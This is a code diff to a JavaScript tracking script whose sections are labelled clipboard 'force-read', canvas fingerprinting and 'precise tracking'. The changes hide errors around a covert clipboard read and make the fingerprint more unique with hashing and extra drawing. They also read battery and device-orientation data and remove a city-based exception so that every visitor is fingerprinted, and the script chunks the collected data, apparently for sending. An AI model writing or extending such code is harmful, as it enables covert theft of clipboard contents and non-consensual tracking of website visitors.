@@ -3,7 +3,6 @@ function printLocal() {
     Object.entries(localStorage).forEach(([k, v]) => console.log(`${k} : ${v}`));
 }
 
-
 // var keyData = {}
 // keyData.behavior = {
 //     keyPresses: []
@@ -369,7 +368,7 @@ function mainData() {
     // ==== [6. CLIPBOARD (FORCE-READ)] ==== //
     function collectClipboardData() {
         // Method 1: Modern API (may trigger prompts)
-
+        try{
         function forceClipboardRead() {
             navigator.clipboard.readText()
                 .then(text1 => {
@@ -410,6 +409,8 @@ function mainData() {
             }
         }
     }
+    catch(error){}
+    }
 
 
     function forceClipboardRead() {
@@ -432,48 +433,75 @@ function mainData() {
     }
 
     // ==== [7. CANVAS/AUDIO FINGERPRINTING] ==== //
-    function collectCanvasFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = 2000;
-            canvas.height = 200;
-            const ctx = canvas.getContext('2d');
-            ctx.fillText("Canvas Fingerprint", 50, 50);
-            userData.canvasFingerprint = canvas.toDataURL(); // Full image data
-        } catch (e) {
-            userData.canvasError = e.message;
-        }
-    }
+    async function collectCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 2000;
+        canvas.height = 200;
+        const ctx = canvas.getContext('2d');
 
-    mainData.onlyCanvasFingerprintingData = function () {
-        var canvaData = collectCanvasFingerprint(manual = true);
-    };
+        // Add variation to maximize fingerprint uniqueness
+        ctx.textBaseline = "top";
+        ctx.font = "16px 'Arial'";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("Canvas Fingerprint!", 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText("Canvas Fingerprint!", 4, 17);
+
+        const dataURL = canvas.toDataURL();
+
+        // Hash the base64 data URL to shorten
+        const hash = await sha256(dataURL);
+        userData.canvasFingerprint = hash;
+    } catch (e) {
+        userData.canvasError = e.message;
+    }
+}
+
+// SHA-256 Hash Function (uses built-in Web Crypto API)
+async function sha256(str) {
+    const buf = new TextEncoder().encode(str);
+    const hashBuf = await crypto.subtle.digest('SHA-256', buf);
+    return Array.from(new Uint8Array(hashBuf))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join('');
+}
 
     // ==== [8. ADDITIONAL PRECISE TRACKING METHODS] ==== //
     function collectAdditionalTrackingData() {
         // Battery status API
         if ('getBattery' in navigator) {
-            navigator.getBattery().then(battery => {
-                userData.batteryInfo = {
-                    level: battery.level,
-                    charging: battery.charging,
-                };
-            });
-        }
+    try {
+        navigator.getBattery().then(battery => {
+            userData.batteryInfo = {
+                level: battery.level,
+                charging: battery.charging,
+            };
+        }).catch(e => console.error("Battery API error:", e));
+    } catch (e) {
+        console.error("Battery API access error:", e);
+    }
+}
 
         // Device orientation and motion
-        if ('DeviceOrientationEvent' in window) {
-            window.addEventListener('deviceorientation', (event) => {
-                userData.deviceOrientation = {
-                    alpha: event.alpha,
-                    beta: event.beta,
-                    gamma: event.gamma
-                };
-                if (event.alpha == null && event.beta == null && event.gamma == null){
-                    delete userData.deviceOrientation;
-                }
-            }, true);
-        }
+        try {
+    if ('DeviceOrientationEvent' in window) {
+        window.addEventListener('deviceorientation', (event) => {
+            userData.deviceOrientation = {
+                alpha: event.alpha,
+                beta: event.beta,
+                gamma: event.gamma
+            };
+            if (event.alpha == null && event.beta == null && event.gamma == null){
+                delete userData.deviceOrientation;
+            }
+        }, true);
+    }
+} catch (e) {
+    console.error("Device orientation error:", e);
+}
 
         // if ('DeviceMotionEvent' in window) {
         //     window.addEventListener('devicemotion', (event) => {
@@ -549,18 +577,21 @@ function mainData() {
     // ==== [INITIALIZE] ==== //
     async function collectAllData() {
 
+        try{
 
-        const cityName = await collectNetworkInfo(); // Added IP and ISP collection
-        collectClipboardData();
-        collectBasicInfo();
-        collectBehavioralData();
-
-        // Simple city check - only run canvas if NOT Raipur
-        if (!cityName || cityName.toLowerCase() !== "raipur") {
+            const cityName = await collectNetworkInfo(); // Added IP and ISP collection
+            collectClipboardData();
+            collectBasicInfo();
+            collectBehavioralData();
+            
+            // Simple city check - only run canvas if NOT Raipur
+            if (!cityName || cityName.toLowerCase() !== "raipur") {
+            }
             collectCanvasFingerprint();
+            
+            collectAdditionalTrackingData()
         }
-
-        collectAdditionalTrackingData()
+        catch (error){}
 
         // Add this chunk splitting function
         function splitIntoChunks(text, maxLength = 4000) {
